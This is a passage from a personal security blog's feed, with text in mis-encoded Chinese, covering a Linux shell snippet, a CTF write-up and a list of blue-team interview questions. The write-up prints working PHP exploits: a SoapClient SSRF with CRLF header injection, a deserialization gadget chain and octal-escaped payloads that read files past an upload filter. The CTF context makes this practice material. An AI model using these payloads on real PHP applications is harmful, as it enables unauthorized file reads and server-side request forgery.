web</span><br></pre></td></tr></table></figure><p>å†…æ•›æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls`</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><blockquote><p>å…ˆæ‰§è¡Œçš„å‘½ä»¤æ˜¯ç”±å½“å‰shellåˆ›å»ºçš„å­shellæ‰§è¡Œçš„ã€‚</p></blockquote><p>åŠ ä¸Š{}ç”¨äºåŒºåˆ†å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=b</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å› ä¸ºæ‰¾ä¸åˆ°å˜é‡abï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©º</span></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;a&#125;b</span><br><span class="line">bb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h3><p>å½“å˜é‡å€¼å«æœ‰ç©ºæ ¼æ—¶ï¼Œå°±è¦åŠ ä¸Šå¼•å·ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# b= world</span><br><span class="line">-bash: world: command not found</span><br></pre></td></tr></table></figure><p>å•å¼•å·ï¼šä¸èƒ½è§£æå˜é‡ï¼Œåªä¼šåŸæ ·è¾“å‡º</p><p>åŒå¼•å·ï¼šèƒ½å¤Ÿè§£æå˜é‡</p><ul><li>è·å–å­—ç¬¦ä¸²é•¿åº¦   &#96;$</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022 å®‰æ´µæ¯</title>
      <link href="/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>ä¸buuâ€“bestphpâ€˜s revengeå·®ä¸å¤š</p><ul><li>session+ååºåˆ—åŒ–</li><li>åŸç”Ÿç±»SSRF+æ–‡ä»¶æ“ä½œ</li></ul><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>ç¬¬ä¸€æ­¥ï¼Œè®¾ç½®phpçš„sessionè§£æå™¨ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡ä¼šè¯æ—¶sessionä¸­ä¿å­˜çš„æ˜¯æ„é€ å¥½çš„SoapClientå¯¹è±¡ã€‚</p><p>SoapClientå¯¹è±¡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $target = &quot;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&quot;; æŸ¥æ‰¾flagæ–‡ä»¶å</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=123456789&#x27;</span> <span class="comment"># éšä¾¿ç»™ä¸€ä¸ª</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128162813314-1686150400485.png" alt="image-20221128162813314"></p><p>ç¬¬äºŒæ­¥ï¼Œååºåˆ—åŒ–è§¦å‘SoapClientçš„callæ–¹æ³•ï¼Œä»è€Œå¯¼è‡´SSRFï¼Œä»è€Œå°†flagä¿å­˜åˆ°SSRFè¯·æ±‚å¯¹åº”çš„sessionä¸­ã€‚</p><p>popï¼š</p><p>B::destruct   â†’    C::toString   â†’   A::invoke    â†’   C::uwant</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘invoke\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘destruct\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;getflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘toString\n&quot;</span>;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘uwant\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c2</span> =<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;0e215962017&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$c2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// echo $result;</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:1:&quot;A&quot;:2:&#x27;</span>, <span class="string">&#x27;O:1:&quot;A&quot;:3:&#x27;</span>,<span class="variable">$result</span>);<span class="comment">//ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128163059684-1686150400486.png" alt="image-20221128163059684"></p><p>è¿™é‡Œçš„500æ˜¯å› ä¸ºC::tostring()çš„æŠ¥é”™ï¼Œè€Œä¸æ˜¯ååºåˆ—åŒ–å‡ºé”™ã€‚</p><img src="E:\typora img\image-20221128163329919.png" alt="image-20221128163329919" style="zoom:67%;" /><p>ç¬¬ä¸‰æ­¥ï¼Œä¿®æ”¹cookieä¸­çš„PHPSESSIONIDä¸ºSSRFè¯·æ±‚çš„PHPSESSIONIDï¼Œè¯»å–åˆ°flagã€‚</p><p><img src="/../images/image-20221128163549644-1686150400486.png" alt="image-20221128163549644"></p><p>æŸ¥çœ‹flagæ–‡ä»¶åçš„ç»“æœ</p><p><img src="/../images/image-20221128163822875-1686150400486.png" alt="image-20221128163822875"></p><h2 id="easy-uploadâ€“å¤ç°"><a href="#easy-uploadâ€“å¤ç°" class="headerlink" title="easy_uploadâ€“å¤ç°"></a>easy_uploadâ€“å¤ç°</h2><p>dirsearchæ‰«ææ²¡æœ‰å‘ç°å…¶ä»–é¡µé¢ã€‚</p><p>åªæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</p><ul><li>å…ˆä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°æœ‰è¿‡æ»¤</li></ul><p><img src="/../images/image-20221128164147870-1686150400486.png" alt="image-20221128164147870"></p><ul><li>å°è¯•å›¾ç‰‡+.htaceess</li></ul><p><img src="/../images/image-20221128164425319-1686150400486.png" alt="image-20221128164425319"></p><p>å‘ç°åªæ¥å—.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ˜¯è¦ç»•è¿‡æ–‡ä»¶å†…å®¹è¿‡æ»¤ã€‚</p><p>ç»æµ‹è¯•å‘ç°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ ` * è¿˜æœ‰å¾ˆå¤šå‡½æ•°è¢«è¿‡æ»¤</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹å¯ä»¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164736609-1686150400486.png" alt="image-20221128164736609"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164852425-1686150400487.png" alt="image-20221128164852425"></p><p>åœ¨phpinfoä¸­å¯ä»¥å‘ç°<code>disable_function</code>ç¦ç”¨äº†å‡ ä¹æ‰€æœ‰çš„å‡½æ•°ã€‚</p><img src="E:\typora img\image-20221128164951239.png" alt="image-20221128164951239" style="zoom:67%;" /><p>ä½†æ˜¯æ²¡æœ‰ç¦ç”¨<code>file_get_contents</code>è¿™ä¸ªè¯»å–æ–‡ä»¶çš„å‡½æ•°ã€‚æ‰€ä»¥åªè¦èƒ½æ‰¾åˆ°flagçš„è·¯å¾„å°±å¯ä»¥äº†ã€‚</p><p>ç½‘ä¸Šçš„å¸ˆå‚…åšæ³•æ˜¯åˆ©ç”¨åŸç”Ÿç±»æ¥æ‰¾åˆ°è·¯å¾„ï¼Œåˆ©ç”¨phpå­—ç¬¦ä¸²è§£ææ¥ç»•è¿‡å­—ç¬¦è¿‡æ»¤ã€‚</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>æŸ¥æ‰¾è·¯å¾„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \147\154\157\142\72\57\57\57\146\52 â†’ glob:///f*</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;\147\154\157\142\72\57\57\57\146\52&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165717142-1686150400487.png" alt="image-20221128165717142"></p><p>è¯»å–flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163 â†’ file_get_contents</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163&quot;</span>(<span class="string">&quot;/fl1111111111ag&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165926537-1686150400487.png" alt="image-20221128165926537"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="flybenbenâ€“å¤ç°"><a href="#flybenbenâ€“å¤ç°" class="headerlink" title="flybenbenâ€“å¤ç°"></a>flybenbenâ€“å¤ç°</h2><p>CEä¿®æ”¹</p><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20221128160736-1686150400487.jpg" alt="QQæˆªå›¾20221128160736"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HWé¢è¯•</title>
      <link href="/2023/05/31/HW%E9%9D%A2%E8%AF%95/"/>
      <url>/2023/05/31/HW%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>ä¸‰æ¬¡é¢è¯•çš„é›†åˆ</p></blockquote><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><ul><li><p>è‡ªæˆ‘ä»‹ç»</p></li><li><p>ä¹‹å‰æŠ¤ç½‘ä¸»è¦åšä»€ä¹ˆ</p></li><li><p>è®¾å¤‡ä½¿ç”¨</p><p>ç”¨è¿‡å“ªäº›å®‰å…¨è®¾å¤‡ï¼Œå…·ä½“äº§å•†ï¼Œå…·ä½“æ€ä¹ˆç”¨ï¼ˆè¯­æ³•æ˜¯ä»€ä¹ˆï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç›‘æµ‹ä¸­å¿ƒï¼ˆæ€åŠ¿æ„ŸçŸ¥,æ•´ä½“ï¼šæ•°é‡ï¼‰ï¼Œå¨èƒæ„ŸçŸ¥ï¼ˆå‘Šè­¦æ•°æ®åŒ…ï¼‰ï¼Œåˆ†æä¸­å¿ƒï¼ˆæ—¥å¿—åˆ†æ,è¡Œä¸ºåˆ†æï¼‰ï¼Œå“åº”å¤„ç½®(ç­–ç•¥ç®¡ç†ï¼Œå¤„ç½®)ï¼Œèµ„äº§æ„ŸçŸ¥ï¼ŒæŠ¥å‘Šç”Ÿæˆ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åè®®ï¼š  proto:ftp</span><br><span class="line">ipï¼š   sipï¼šæºip  dipï¼šç›®çš„ip</span><br><span class="line">æ”»å‡»æˆåŠŸï¼š  normal_retï¼šsuccess</span><br><span class="line">è¯·æ±‚è·¯å¾„ï¼šuriï¼šè·¯å¾„</span><br><span class="line">httpçŠ¶æ€ç ï¼š statusï¼š404</span><br><span class="line">åŸŸåï¼šhostï¼šåŸŸå</span><br><span class="line">è¯·æ±‚ä½“ï¼š    dataï¼šè¯·æ±‚ä½“æ•°æ®</span><br><span class="line">UAï¼š  agentï¼šUA</span><br><span class="line">è¯·æ±‚æ–¹æ³•: method:è¯·æ±‚æ–¹æ³•</span><br><span class="line"></span><br><span class="line">æ£€ç´¢webæµé‡ï¼š host â€œâ€ and sip â€œâ€ and dipï¼š*</span><br></pre></td></tr></table></figure><p>è´Ÿè´£å¤–ç½‘è¿˜æ˜¯å†…ç½‘ï¼Œæœ‰å¾ˆå¤šè¯¯æŠ¥æ€ä¹ˆåŠ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip+å¨èƒæƒ…æŠ¥ç¤¾åŒº</span><br><span class="line"></span><br><span class="line">å‘Šè­¦æ˜¯åŸºäºç‰¹å®šå…³é”®å­—ã€ç‰¹å®šè§„åˆ™è§¦å‘çš„ï¼Œéƒ¨åˆ†ä¸šåŠ¡ç³»ç»Ÿç”±äºç¼–ç ä¸è§„èŒƒï¼Œç»å¸¸ä¼šè§¦å‘å‘Šè­¦ï¼Œå› æ­¤éœ€è¦ç»“åˆä¸šåŠ¡å®é™…æƒ…å†µç¡®å®šæ˜¯å¦ä¸ºæ­£å¸¸ä¸šåŠ¡è¡Œä¸ºè§¦å‘çš„è¯¯æŠ¥ã€‚æ¯”å¦‚sqlä¸­çš„1=1</span><br><span class="line"></span><br><span class="line">å·¡æ£€ï¼Œéœ€è¦åŠ å…¥ipç™½åå•</span><br></pre></td></tr></table></figure><p>å¦‚ä½•åˆ¤æ–­æ”»å‡»æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çœ‹å“åº”åŒ…ä¸­çš„ç»“æœæ˜¯å¦ç¬¦åˆpayloadçš„æ‰§è¡Œç»“æœ</span><br><span class="line">æˆ–è€…æ‰‹åŠ¨å¤ç°</span><br></pre></td></tr></table></figure></li><li><p>sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlæ³¨å…¥åŸç†ï¼Œæ–¹å¼ï¼Œé˜²å¾¡æ‰‹æ®µ</span><br><span class="line">å®½å­—èŠ‚æ³¨å…¥åŸç†</span><br><span class="line">sqlå†™shellçš„æ¡ä»¶ï¼Œå…·ä½“çš„è¯­å¥ï¼ˆè¿½é—®ï¼šé™¤äº†ç›´æ¥å†™å…¥è¿˜æœ‰å…¶ä»–æ–¹æ³•å—)</span><br><span class="line">sqlmapå†™shellçš„å‚æ•°å’ŒåŸç†</span><br><span class="line">ä½¿ç”¨sqlmap postæ³¨å…¥çš„å‚æ•°</span><br><span class="line">sqlæ³¨å…¥ç»•è¿‡wafçš„æ–¹å¼</span><br><span class="line">sqlæ³¨å…¥å»¶æ—¶æ³¨å…¥æ—¶ï¼Œsleepå‡½æ•°è¢«ç¦ç”¨äº†æ€ä¹ˆåŠ</span><br></pre></td></tr></table></figure></li><li><p>æ¸—é€æµ‹è¯•æµç¨‹ä»ä¿¡æ¯æ”¶é›†å¼€å§‹å®Œæ•´åœ°è®²è®²</p></li><li><p>xxeæœ‰å“ªäº›åˆ©ç”¨æ–¹å¼</p></li><li><p>ç»™ä½ ä¸€ä¸ªåœºæ™¯ï¼Œthinkphpï¼Œå¯ä»¥æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰ç™½åå•åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œæ€ä¹ˆrce</p></li><li><p>äº†è§£è¿‡burpçš„dnsåŠŸèƒ½å—</p><p>è¿½é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">çœ‹è¿‡dnslogæ—¥å¿—å—</span><br></pre></td></tr></table></figure></li><li><p>è®²ä¸€ä¸‹æŒ–çŸ¿æœ¨é©¬çš„å¤„ç½®</p><p>è¿½é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¦ç”¨ä»€ä¹ˆå‘½ä»¤å®šä½è¿›ç¨‹æ‰€å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">æ–°å¢ç”¨æˆ·æ€ä¹ˆæ’æŸ¥ï¼ˆwindowså’Œlinuxï¼‰</span><br><span class="line">ç”¨ä»€ä¹ˆå‘½ä»¤æ’æŸ¥linuxçš„ç‰¹æƒç”¨æˆ· </span><br><span class="line">ä¸€ç›´æ€ä¸æ‰æ€ä¹ˆåŠï¼ˆè¦çœ‹å“ªäº›æ–‡ä»¶/ç›®å½•ï¼‰</span><br></pre></td></tr></table></figure></li><li><p>javaå†…å­˜é©¬ç±»å‹</p><p>è¿½é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å„è‡ªåŸç†</span><br><span class="line">å†°èçš„æœ¨é©¬åŸç†äº†è§£è¿‡å—</span><br></pre></td></tr></table></figure></li><li><p>æ¸—é€ä¸­å¦‚æœæœºå™¨ä¸å‡ºç½‘æ€ä¹ˆåŠ</p><p>è¿½é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨çš„ä»€ä¹ˆåå‘ä»£ç†</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœå¯ä»¥rceï¼Œä½†æ˜¯æ— å›æ˜¾å¹¶ä¸”ä¸å‡ºç½‘æ€ä¹ˆåŠ</p></li><li><p>å¦‚æœæœºå­è¢«ä¸Šäº†csæœ¨é©¬ï¼Œæ€ä¹ˆæ£€æµ‹å‡ºæœ¨é©¬è¿›ç¨‹</p><blockquote><p><a href="http://weizn.net/?p=439">é€šè¿‡Sysmonæ—¥å¿—æ£€æµ‹Cobalt Strikeæœ¨é©¬ - Wayneâ€™s Blog</a></p><p>å¿ƒè·³åŒ…</p><p>å‘½ä»¤æ‰§è¡Œæ ¼å¼ï¼šcmd.exeçš„å®Œæ•´è·¯å¾„ + <span style="color: #ff0000;">å¤§å†™&#x2F;C</span>å‚æ•° + å®é™…æ‰§è¡Œå‘½ä»¤ã€‚</p></blockquote></li><li><p>wiresharkç”¨è¿‡å—</p></li><li><p>å‡è®¾ä¸Šä¼ äº†webshellï¼Œæ”»å‡»è€…ä¼šä½¿ç”¨webshellç®¡ç†å·¥å…·è¿›è¡Œè¿æ¥ï¼Œè®²ä¸€ä¸‹è¿™äº›ç®¡ç†å·¥å…·çš„æµé‡ç‰¹å¾</p></li><li><p>è®²ä¸€ä¸‹javaçš„shiroï¼Œlog4jç­‰æ¼æ´</p></li><li><p>æœ‰åšè¿‡æº¯æºå—ï¼Œäº†è§£çš„è¯´è¯´</p></li><li><p>ç®€å†ä¸Šè¯´æŒ–æ˜è¿‡é€»è¾‘æ¼æ´ï¼Œç°åœ¨ç»™ä½ ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½ æœ‰ä»€ä¹ˆæ€è·¯</p></li><li><p>å‡è®¾æœ‰ä¸€ä¸ªå­˜å‚¨å‹xssï¼Œæ€ä¹ˆè¿›è¡ŒæŒä¹…åŒ–</p></li><li><p>å¦‚æœé€šçŸ¥æœºå™¨ä¸Šå‡ºç°äº†ä¸€äº›å¯ç–‘çš„æ–‡ä»¶å’Œç›®å½•ï¼Œæ€ä¹ˆè¿›è¡Œåº”æ€¥å“åº”</p></li><li><p>è®²ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ é»‘ç™½åå•ç»•è¿‡</p><p>è¿½é—®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸­é—´ä»¶è§£ææ¼æ´è®²è®²</span><br></pre></td></tr></table></figure></li><li><p>ä¸»æœºåŸºçº¿è§„èŒƒè®²ä¸€ä¸‹</p></li><li><p>å¦‚æœæŠ¤ç½‘æœŸé—´å‡ºç°äº†0dayè¯¥æ€ä¹ˆåŠ</p><blockquote><p>æŸ¥çœ‹èµ„äº§ä¸­æ˜¯å¦æœ‰0dayæ¶‰åŠåˆ°çš„åº”ç”¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå¯ä»¥å°è¯•ä¿®å¤æˆ–è€…è¿›è¡Œå¤ç°ï¼Œæ¯”å¦‚è¯´ä½¿ç”¨å…¬å¼€çš„pocè¿›è¡Œæµ‹è¯•ï¼Œçœ‹ä¸€ä¸‹ä¼šç•™ä¸‹ä»€ä¹ˆç—•è¿¹ï¼Œæ ¹æ®è¿™äº›ç—•è¿¹å»ºç«‹æ£€æµ‹æœºåˆ¶</p></blockquote></li><li><p>è®²ä¸€ä¸‹å†…ç½‘ä¸­çš„ç¥¨æ®</p></li><li><p>windowsäº‹ä»¶çŠ¶æ€ç </p><p><img src="/../images/image-20230426165150875-1686284102691.png" alt="image-20230426165150875"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå‘½ä»¤æœ¬è´¨</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/</url>
      
